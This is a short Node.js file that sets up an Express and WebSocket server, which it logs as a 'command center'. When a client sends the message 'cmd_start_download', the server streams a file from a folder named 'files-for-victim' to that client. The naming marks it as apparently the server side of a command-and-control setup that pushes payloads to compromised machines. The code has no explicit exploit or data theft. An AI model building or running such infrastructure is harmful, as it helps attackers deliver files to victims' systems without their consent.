const http = require("http");
const fs = require("fs");
const express = require("express");
const Websocket = require("ws");

const PORT = 9000;
const app = express();
const server = http.createServer(app);
const websocketServer = new Websocket.Server({ server });

function decode1(data) {
  return JSON.parse(data);
}

websocketServer.on("connection", (weboscket) => {
  console.log("client connected");

  weboscket.on("message", (message) => {
    if (decode1(message) === "cmd_start_download") {
      const stream = fs.createReadStream("./files-for-victim/1.txt");
      stream.on("data", (data) => {
        weboscket.send(data);
      });
      stream.on("end", () => {
        weboscket.send("fileEnd");
      });
      stream.on("error", (error) => {
        console.error("Error reading file:", error);
        weboscket.send("fileError");
      });
    }
    console.log("msg:", decode1(message));
  });

  weboscket.on("close", () => {
    console.log("client disconnected");
  });
});

server.listen(PORT, () => {
  console.log(`command center running on port ${PORT}`);
});
